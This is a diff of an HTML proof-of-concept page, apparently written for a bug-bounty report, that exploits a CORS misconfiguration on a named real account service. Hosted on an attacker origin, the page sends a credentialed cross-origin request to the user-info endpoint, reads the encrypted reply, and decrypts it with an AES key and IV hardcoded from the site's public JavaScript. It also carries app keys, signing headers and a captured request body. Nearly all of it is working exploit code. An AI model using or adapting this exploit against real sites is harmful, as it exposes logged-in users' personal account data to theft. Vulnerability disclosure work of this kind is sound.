@@ -3,7 +3,6 @@
   <head>
     <meta charset="UTF-8" />
     <title>CORS PoC — id-sg.realme.com</title>
-    <!-- CryptoJS dari CDN publik — sama seperti yang dipakai realme di sisi client -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
     <style>
       * {
@@ -15,41 +14,72 @@
         font-family: "Courier New", monospace;
         background: #0d0d0d;
         color: #e0e0e0;
-        padding: 24px;
+        padding: 20px;
+        font-size: 13px;
       }
       h2 {
         color: #ff6b6b;
-        margin-bottom: 6px;
-        font-size: 1.1rem;
+        margin-bottom: 4px;
+        font-size: 1.05rem;
       }
       .meta {
-        color: #888;
-        font-size: 0.85rem;
-        margin-bottom: 20px;
+        color: #666;
+        font-size: 0.8rem;
+        margin-bottom: 16px;
       }
       .meta span {
         color: #4fc3f7;
       }
       .box {
-        background: #1a1a1a;
-        border: 1px solid #333;
-        border-radius: 6px;
-        padding: 16px;
-        margin-bottom: 14px;
+        background: #141414;
+        border: 1px solid #2a2a2a;
+        border-radius: 5px;
+        padding: 14px;
+        margin-bottom: 12px;
       }
       .box h3 {
-        color: #aaa;
-        font-size: 0.8rem;
+        color: #888;
+        font-size: 0.72rem;
         text-transform: uppercase;
         letter-spacing: 1px;
         margin-bottom: 10px;
       }
+      label {
+        color: #aaa;
+        font-size: 0.78rem;
+        display: block;
+        margin-bottom: 3px;
+        margin-top: 8px;
+      }
+      label:first-child {
+        margin-top: 0;
+      }
+      input,
+      textarea {
+        width: 100%;
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 3px;
+        color: #c8e6c9;
+        font-family: "Courier New", monospace;
+        font-size: 0.78rem;
+        padding: 6px 8px;
+        outline: none;
+      }
+      input:focus,
+      textarea:focus {
+        border-color: #555;
+      }
+      textarea {
+        resize: vertical;
+        min-height: 60px;
+      }
       pre {
-        font-size: 0.82rem;
+        font-size: 0.78rem;
         white-space: pre-wrap;
         word-break: break-all;
         color: #c8e6c9;
-        line-height: 1.5;
+        line-height: 1.55;
       }
       pre.error {
         color: #ef9a9a;
@@ -57,38 +87,51 @@
       pre.warn {
         color: #ffe082;
       }
-      pre.info {
-        color: #80d8ff;
-      }
       .btn {
-        display: inline-block;
-        padding: 9px 22px;
+        padding: 8px 20px;
         background: #c62828;
         color: #fff;
         border: none;
-        border-radius: 4px;
+        border-radius: 3px;
         cursor: pointer;
         font-family: monospace;
-        font-size: 0.9rem;
-        margin-right: 10px;
-        margin-bottom: 14px;
+        font-size: 0.85rem;
+        margin-right: 8px;
       }
       .btn:hover {
         background: #e53935;
       }
-      .banner {
+      .btn.sec {
+        background: #1565c0;
+      }
+      .btn.sec:hover {
+        background: #1976d2;
+      }
+      .step {
+        color: #80cbc4;
+        font-size: 0.78rem;
+        margin-bottom: 6px;
+      }
+      .step strong {
+        color: #4db6ac;
+      }
+      .success-banner {
         background: #1b5e20;
-        border: 1px solid #2e7d32;
-        border-radius: 4px;
-        padding: 12px 16px;
+        border: 1px solid #388e3c;
+        border-radius: 3px;
+        padding: 8px 12px;
         color: #a5d6a7;
-        font-size: 0.85rem;
+        font-size: 0.8rem;
         margin-bottom: 10px;
       }
-      .banner.red {
-        background: #b71c1c;
-        border-color: #c62828;
-        color: #ffcdd2;
+      .section-title {
+        color: #ffcc80;
+        font-size: 0.72rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin: 12px 0 6px;
+        border-bottom: 1px solid #2a2a2a;
+        padding-bottom: 4px;
       }
     </style>
   </head>
@@ -100,59 +143,101 @@
       ><br />
       Attacker origin:
       <span>https://ikur007.github.io/poccorsrealme.html</span> &nbsp;|&nbsp;
-      Researcher: <span>HackerOne-ikur007</span>
+      <span>HackerOne-ikur007</span>
     </p>
 
+    <!-- STEP 1: Ambil Key segar -->
     <div class="box">
-      <h3>⚠ Cara pakai</h3>
-      <pre class="warn">
-1. Login ke akun realme test di https://id.realme.com (tab lain, browser SAMA)
-2. Kembali ke halaman ini lalu klik tombol
-3. PoC akan: fetch cross-origin → baca ciphertext → decrypt AES → tampilkan plaintext</pre
+      <h3>
+        🔑 Step 1 — Ambil AES Key dari id.realme.com (buka Console di tab
+        realme)
+      </h3>
+      <pre class="step">
+Jalankan di Console <strong>id.realme.com</strong>:
+const e = window.__ucEncrypterHelper__;
+console.log('KEY:', e.aesKey, '| IV:', e.aesIv);</pre
+      >
+      <label>AES Key (paste hasil dari console)</label>
+      <input
+        type="text"
+        id="inp-key"
+        value="8ZFd9CSovFYqCiaj"
+        placeholder="contoh: 8ZFd9CSovFYqCiaj"
+      />
+      <label>AES IV (paste hasil dari console)</label>
+      <input
+        type="text"
+        id="inp-iv"
+        value="mH3w6dki5gUVprwg"
+        placeholder="contoh: mH3w6dki5gUVprwg"
+      />
+    </div>
+
+    <!-- STEP 2: Request body segar -->
+    <div class="box">
+      <h3>
+        📤 Step 2 — Request body + headers segar dari Burp (opsional, untuk
+        validasi)
+      </h3>
+      <pre class="step warn">
+Body & X-Sign di bawah dari capture lama — kalau server reject, tangkap request baru dari Burp
+lalu update X-Requesttime, X-Sign, dan Body.</pre
+      >
+      <label>X-Requesttime</label>
+      <input type="text" id="inp-rt" value="1789221936829" />
+      <label>X-Sign</label>
+      <input type="text" id="inp-sign" value="EbhHOn3R4iKv8Qv73383UDGz21s=" />
+      <label>Request Body (envelope encrypted)</label>
+      <textarea id="inp-body">
+"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9ZxlU0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="</textarea
       >
     </div>
 
-    <div class="box">
-      <h3>🔑 Key Info (hardcoded dari JS bundle publik realme)</h3>
-      <pre class="info">
-File  : https://id.realme.com/_nuxt/get-brand-text-c2a79658.js
-Object: window.__ucEncrypterHelper__
-Key   : 8ZFd9CSovFYqCiaj   (AES-CBC 128-bit, static di bundle)
-IV    : mH3w6dki5gUVprwg   (static di bundle)
-→ Siapapun bisa baca ini dari source JS realme tanpa login</pre
-      >
-    </div>
-
-    <button class="btn" onclick="runExploit()">
-      ▶ Jalankan PoC — Fetch + Decrypt
+    <!-- STEP 3: Jalankan -->
+    <button class="btn" onclick="runExploit()">▶ Jalankan PoC</button>
+    <button class="btn sec" onclick="testDecrypt()">
+      🔓 Test Decrypt Manual
     </button>
 
-    <div id="res-box" class="box" style="display: none">
+    <!-- Output -->
+    <div class="box" id="res-box" style="display: none">
       <h3>📥 Hasil</h3>
-      <pre id="output">Loading...</pre>
+      <pre id="output"></pre>
+    </div>
+
+    <!-- Test decrypt manual -->
+    <div class="box" id="dec-box" style="display: none">
+      <h3>
+        🔓 Test Decrypt Manual (tempel ciphertext dari Network tab → Response)
+      </h3>
+      <label
+        >Ciphertext (dari Response tab Network DevTools — jangan ada
+        spasi/newline)</label
+      >
+      <textarea
+        id="inp-cipher"
+        placeholder="Paste ciphertext di sini..."
+        style="min-height: 80px"
+      ></textarea>
+      <br /><br />
+      <button class="btn" onclick="doManualDecrypt()">Decrypt</button>
+      <pre id="dec-out" style="margin-top: 10px; color: #80cbc4"></pre>
     </div>
 
     <script>
-      // ============================================================
-      // KONSTANTA — Key & IV diambil dari JS bundle publik realme
-      // Siapapun bisa mendapatkan ini tanpa login hanya dengan
-      // membuka DevTools di id.realme.com dan melihat source JS.
-      // ============================================================
-      const AES_KEY = "8ZFd9CSovFYqCiaj";
-      const AES_IV = "mH3w6dki5gUVprwg";
       const TARGET = "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
 
-      // Body dari capture Burp (X-Sign stale, tapi CORS tetap terbukti —
-      // server hanya perlu menerima request agar mengembalikan response
-      // dengan ACAO yang merefleksikan attacker origin)
-      const BODY =
-        '"H1ON8P/Uqk8Oh016MPsESLO95VPD3r036Cjr0l6T48g+jKKAWWhShjbbWbE11hnjuYS5ned88WXFB999041FKrOjvHc8dy6h/JzU7LjTQmbSW6pPvkdPgoamAXu+lQGLMiG8Dr8VP6EtvwcJFlti5f+v+wCa9UbXLSwlh3dkLRA=.bt7gd4/oE43AB6EXrj9ZxlU0etM/kMpXDYGLHQjQn/US+2uR5TP6AaEHuFUTjo+Bs1fsbFZRsnG3i7ifEp2yA76vwPJc9vCGBKWKeKR++pt6u9/GFMopLTg9aYUXc2vfHo4P43w35xiNDce3zidYWCadA7QKjG+abPE4r8Tlah8=.MFg="';
-
-      function aesDecrypt(ciphertext) {
-        // Pakai CryptoJS (CDN publik) — algo sama dengan yang dipakai realme
-        const key = CryptoJS.enc.Utf8.parse(AES_KEY);
-        const iv = CryptoJS.enc.Utf8.parse(AES_IV);
-        const dec = CryptoJS.AES.decrypt(ciphertext, key, {
+      // ─── Decrypt AES-CBC dengan CryptoJS ───────────────────────────────────────
+      // FIX: ciphertext raw Base64 harus di-parse sebagai WordArray dulu
+      // bukan dilempar langsung (mode OpenSSL/Salted__)
+      function aesDecrypt(cipherB64, keyStr, ivStr) {
+        const key = CryptoJS.enc.Utf8.parse(keyStr);
+        const iv = CryptoJS.enc.Utf8.parse(ivStr);
+        // parse raw Base64 → CipherParams object
+        const params = CryptoJS.lib.CipherParams.create({
+          ciphertext: CryptoJS.enc.Base64.parse(cipherB64),
+        });
+        const dec = CryptoJS.AES.decrypt(params, key, {
           iv: iv,
           mode: CryptoJS.mode.CBC,
           padding: CryptoJS.pad.Pkcs7,
@@ -164,22 +249,27 @@ IV    : mH3w6dki5gUVprwg   (static di bundle)
         const el = document.getElementById("output");
         el.className = cls;
         el.textContent = text;
+        document.getElementById("res-box").style.display = "";
       }
 
       async function runExploit() {
-        document.getElementById("res-box").style.display = "";
-        log("⏳ Mengirim request cross-origin dengan credentials...");
+        const KEY = document.getElementById("inp-key").value.trim();
+        const IV = document.getElementById("inp-iv").value.trim();
+        const RT = document.getElementById("inp-rt").value.trim();
+        const SIGN = document.getElementById("inp-sign").value.trim();
+        const BODY = document.getElementById("inp-body").value.trim();
+
+        log("⏳ Mengirim cross-origin request dengan credentials...");
 
         try {
-          // STEP 1 — CORS exploit: fetch cross-origin + kirim cookie sesi korban
           const res = await fetch(TARGET, {
             method: "POST",
-            credentials: "include", // ← kunci serangan: kirim cookie acIdAuthSession
+            credentials: "include",
             headers: {
               "Content-Type": "application/json;charset=UTF-8",
               "X-Web-Client-Type": "pc",
               "X-Timezone": "GMT+8",
-              "X-Requesttime": "1789265769024",
+              "X-Requesttime": RT,
               "X-Sign-Key": "4iAEb620alQ8s8c8ss8o0K8sS",
               "X-Biz-Appkey": "TZeSXfQXxrCyjhvARaVrmw",
               "X-App-Fromht": "false",
@@ -189,65 +279,82 @@ IV    : mH3w6dki5gUVprwg   (static di bundle)
               "X-App-Overseaclient": "true",
               "X-App-Acappkey": "CuGsbe6HdAe6vDBHFew2Di",
               "X-Device-Clienttype": "WEB",
-              "X-Sign": "IfpRxIY60gZUE47LQGr4udlUBsg=",
+              "X-Sign": SIGN,
               "Accept-Language": "en-US",
             },
             body: BODY,
           });
 
-          // STEP 2 — Baca ciphertext response
           const cipher = await res.text();
 
-          // STEP 3 — Decrypt pakai key dari JS bundle publik realme
-          let plaintext = "[Decrypt gagal]";
+          // Decrypt
+          let plain = "";
+          let decErr = "";
           try {
-            plaintext = aesDecrypt(cipher);
+            plain = aesDecrypt(cipher, KEY, IV);
           } catch (e) {
-            plaintext =
-              "[Decrypt error: " +
-              e.message +
-              "]\n\nCiphertext mentah:\n" +
-              cipher;
+            decErr = e.message;
           }
 
-          // STEP 4 — Tampilkan hasil (inilah yang akan dikirim ke server attacker di serangan nyata)
           let parsed = null;
-          try {
-            parsed = JSON.parse(plaintext);
-          } catch (e) {}
+          if (plain) {
+            try {
+              parsed = JSON.parse(plain);
+            } catch (e) {}
+          }
+
+          const decResult = plain
+            ? parsed
+              ? JSON.stringify(parsed, null, 2)
+              : plain
+            : `[Decrypt gagal: ${decErr || "hasil kosong — kemungkinan key/IV tidak cocok dengan sesi ini"}]\n\nCoba:\n1. Ambil key segar dari Console id.realme.com\n2. Paste di field AES Key di atas\n3. Jalankan lagi`;
 
           log(
-            "╔══════════════════════════════════════════════════════════════╗\n" +
-              "║  ✅ CORS BYPASS + DECRYPT BERHASIL — DATA USER TERBACA      ║\n" +
-              "╚══════════════════════════════════════════════════════════════╝\n\n" +
+            "╔══════════════════════════════════════════════════════════╗\n" +
+              "║  ✅ CORS BYPASS BERHASIL — RESPONSE TERBACA CROSS-ORIGIN ║\n" +
+              "╚══════════════════════════════════════════════════════════╝\n\n" +
               "HTTP Status : " +
               res.status +
               "\n" +
-              "Attacker origin (ikur007.github.io) dapat membaca response:\n\n" +
-              "════════ PLAINTEXT (setelah AES-CBC decrypt) ════════\n" +
-              (parsed ? JSON.stringify(parsed, null, 2) : plaintext) +
-              "\n\n" +
-              "════════ CIPHERTEXT MENTAH (dari response) ════════\n" +
-              cipher.substring(0, 120) +
+              "Browser asal: https://ikur007.github.io (attacker domain)\n\n" +
+              "══ CIPHERTEXT (dibaca JS attacker dari response) ══\n" +
+              cipher.substring(0, 100) +
               "...\n\n" +
-              "════════ KEY INFO (dari JS bundle publik) ════════\n" +
-              "AES Key : " +
-              AES_KEY +
-              "\n" +
-              "AES IV  : " +
-              AES_IV,
+              "══ PLAINTEXT (AES-CBC decrypt, key dari JS bundle publik) ══\n" +
+              decResult,
           );
         } catch (err) {
           log(
-            "❌ Request gagal: " +
+            "❌ Fetch gagal: " +
               err +
               "\n\n" +
               "Cek:\n" +
-              "1. Sudah login di id.realme.com tab lain (browser sama)?\n" +
-              "2. Buka Console F12 untuk detail error CORS\n" +
-              '3. Jika "Failed to fetch" → kemungkinan sesi expired, login ulang',
+              "1. Login dulu di id.realme.com tab lain (browser sama)\n" +
+              "2. Buka F12 → Console untuk detail error\n" +
+              '3. Kalau "Failed to fetch" → session expired, login ulang',
             "error",
           );
+        }
+      }
+
+      function testDecrypt() {
+        document.getElementById("dec-box").style.display = "";
+      }
+
+      function doManualDecrypt() {
+        const KEY = document.getElementById("inp-key").value.trim();
+        const IV = document.getElementById("inp-iv").value.trim();
+        const cipher = document.getElementById("inp-cipher").value.trim();
+        const out = document.getElementById("dec-out");
+        try {
+          const plain = aesDecrypt(cipher, KEY, IV);
+          out.textContent = plain
+            ? plain
+            : "[Hasil kosong — key/IV tidak cocok]";
+          out.style.color = plain ? "#a5d6a7" : "#ffe082";
+        } catch (e) {
+          out.textContent = "Error: " + e.message;
+          out.style.color = "#ef9a9a";
         }
       }
     </script>
